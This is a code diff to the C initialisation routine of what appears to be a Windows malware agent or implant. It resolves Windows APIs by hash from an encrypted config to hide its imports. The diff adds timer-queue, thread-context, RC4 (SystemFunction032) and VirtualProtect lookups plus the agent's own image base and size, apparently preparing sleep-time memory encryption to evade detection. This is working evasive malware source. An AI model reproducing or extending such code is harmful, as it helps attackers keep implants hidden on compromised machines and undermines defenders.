@@ -3,7 +3,6 @@
 #include "agent.h"
 #include "localcstd.h"
 #include "parser.h"
-#include "Helpers.h"
 #include "token.h"
 #include "ListManager.h"
 #include "evasive.h"
@@ -29,7 +28,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[30] = { 0 };
+UINT64 ApiHashes[46] = { 0 };
 
 INT init_agent() {
 
@@ -40,7 +39,7 @@ INT init_agent() {
     agent->pTeb = (void*)__readfsdword(0x18);
 #endif
 
-    // printhashes();  // after we've received the function pointers we can print the hashes of the function names. TODO remove for production only needed while developing.
+     printhashes();  // after we've received the function pointers we can print the hashes of the function names. TODO remove for production only needed while developing.
 
     if (!ParseHashConfig()) {
         return -1;
@@ -127,6 +126,58 @@ INT init_agent() {
     if (!agent->apis->pNtGetTickCount) {
         return -1;
     }
+    agent->apis->pRtlCreateTimerQueue = (t_RtlCreateTimerQueue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[30]);
+    if (!agent->apis->pRtlCreateTimerQueue) {
+        return -1;
+    }
+    agent->apis->pNtCreateEvent = (t_NtCreateEvent)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[31]);
+    if (!agent->apis->pNtCreateEvent) {
+        return -1;
+    }
+
+    agent->apis->pRtlCaptureContext = (t_RtlCaptureContext)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[32]);
+    if (!agent->apis->pRtlCaptureContext)
+        return -1;
+
+    agent->apis->pRtlCreateTimer = (t_RtlCreateTimer)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[33]);
+    if (!agent->apis->pRtlCreateTimer)
+        return -1;
+
+    agent->apis->pRtlRegisterWait = (t_RtlRegisterWait)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[34]);
+    if (!agent->apis->pRtlRegisterWait)
+        return -1;
+
+    agent->apis->pRtlDeleteTimerQueue = (t_RtlDeleteTimerQueue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[35]);
+    if (!agent->apis->pRtlDeleteTimerQueue)
+        return -1;
+
+    agent->apis->pRtlCopyMappedMemory = (t_RtlCopyMappedMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[36]);
+    if (!agent->apis->pRtlCopyMappedMemory)
+        return -1;
+
+    agent->apis->pNtWaitForSingleObject = (t_NtWaitForSingleObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[37]);
+    if (!agent->apis->pNtWaitForSingleObject)
+       return -1;
+
+    agent->apis->pNtSignalAndWaitForSingleObject = (t_NtSignalAndWaitForSingleObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[38]);
+    if (!agent->apis->pNtSignalAndWaitForSingleObject)
+        return -1;
+
+    agent->apis->pNtContinue = (t_NtContinue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[39]);
+    if (!agent->apis->pNtContinue)
+        return -1;
+
+    agent->apis->pNtSetEvent = (t_NtSetEvent)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[40]);
+    if (!agent->apis->pNtSetEvent)
+        return -1;
+
+    agent->apis->pNtSetContextThread = (t_NtSetContextThread)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[41]);
+    if (!agent->apis->pNtSetContextThread)
+        return -1;
+
+    agent->apis->pNtDuplicateObject = (t_NtDuplicateObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[42]);
+    if (!agent->apis->pNtDuplicateObject)
+        return -1;
 
     //obtain iphlpapi apis
     agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)RetrieveFunctionPointerFromhash(agent->apis->hIphlpapi, ApiHashes[19]);
@@ -140,6 +191,9 @@ INT init_agent() {
     if (!agent->apis->pGetUserNameA) {
         return -1;
     }
+    agent->apis->pSystemFunction032 = (t_SystemFunction032)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[44]);
+    if (!agent->apis->pSystemFunction032)
+        return -1;
 
     //obtain kernel32 apis
     agent->apis->pGetComputerNameExA = (t_GetComputerNameExA)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[21]);
@@ -160,6 +214,13 @@ INT init_agent() {
 	if (!agent->apis->pGetSystemTimeAsFileTime) {
 		return -1;
 	}
+    agent->apis->pVirtualProtect = (t_VirtualProtect)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[43]);
+    if (!agent->apis->pVirtualProtect)
+        return -1;
+    
+    agent->apis->pWaitForSingleObjectEx = (t_WaitForSingleObjectEx)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[45]);
+    if (!agent->apis->pWaitForSingleObjectEx)
+        return -1;
 
     //obtain user32 apis
     agent->apis->pGetSystemMetrics = (t_GetSystemMetrics)RetrieveFunctionPointerFromhash(agent->apis->hUser32, ApiHashes[29]);
@@ -243,6 +304,8 @@ INT init_agent() {
     agent->EncryptedIV = EncryptedIV;
     agent->EncryptedIVSize = EncryptedIvSize;
 
+    agent->ModuleBaseAddr = GetModuleBaseAddr(0);
+    agent->ImageSize = GetImageSize(agent->ModuleBaseAddr);
 
     return 0;
 }
@@ -344,10 +407,10 @@ INT ParseConfig() {
 
 BOOL ParseHashConfig() {
     AESCTR(HashConfigBytes, sizeof(HashConfigBytes), HashKeyBytes, sizeof(HashKeyBytes), HashIVBytes);
-    for (int i = 0; i < 2; i++) {
+    for (int i = 0; i < sizeof(DllHashes)/sizeof(UINT64); i++) {
         MemoryCopy(&DllHashes[i], HashConfigBytes + (i * sizeof(UINT64)), sizeof(UINT64));
     }
-    for (int i = 0; i < 30; i++) {
+    for (int i = 0; i < sizeof(ApiHashes) / sizeof(UINT64); i++) {
         MemoryCopy(&ApiHashes[i], HashConfigBytes + ((i + 2) * sizeof(UINT64)), sizeof(UINT64));
     }
     HMODULE k32 = RetrieveModuleHandleFromHash(DllHashes[0]);
@@ -384,9 +447,9 @@ BOOL ParseHashConfig() {
     //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.
     UINT Length = 0;
     UINT TotalLength = 0;
-    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64)), sizeof(UINT));
+    MemoryCopy(&Length, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes)), sizeof(UINT));
     LPSTR Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
-    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + sizeof(UINT)), Length);
+    MemoryCopy(Buffer, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + sizeof(UINT)), Length);
     agent->apis->hAdvapi32 = agent->apis->pLoadLibraryA(Buffer);
     if (agent->apis->hAdvapi32 == NULL) {
         return -1;
@@ -395,9 +458,9 @@ BOOL ParseHashConfig() {
 	RtlSecureZeroMemory(Buffer, Length);
     agent->apis->pLocalFree(Buffer);
 
-    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    MemoryCopy(&Length, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength), sizeof(UINT));
     Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
-    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    MemoryCopy(Buffer, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength + sizeof(UINT)), Length);
     agent->apis->hWinHttp = agent->apis->pLoadLibraryA(Buffer);
     if (agent->apis->hWinHttp == NULL) {
         return -1;
@@ -406,9 +469,9 @@ BOOL ParseHashConfig() {
 	RtlSecureZeroMemory(Buffer, Length);
     agent->apis->pLocalFree(Buffer);
 
-    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    MemoryCopy(&Length, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength), sizeof(UINT));
     Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
-    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    MemoryCopy(Buffer, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength + sizeof(UINT)), Length);
     agent->apis->hUser32 = agent->apis->pLoadLibraryA(Buffer);
     if (agent->apis->hUser32 == NULL) {
         return -1;
@@ -417,9 +480,9 @@ BOOL ParseHashConfig() {
 	RtlSecureZeroMemory(Buffer, Length);
     agent->apis->pLocalFree(Buffer);
 
-    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    MemoryCopy(&Length, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength), sizeof(UINT));
     Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
-    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    MemoryCopy(Buffer, HashConfigBytes + (sizeof(DllHashes) + sizeof(ApiHashes) + TotalLength + sizeof(UINT)), Length);
     agent->apis->hIphlpapi = agent->apis->pLoadLibraryA(Buffer);
     if (agent->apis->hIphlpapi == NULL) {
         return -1;
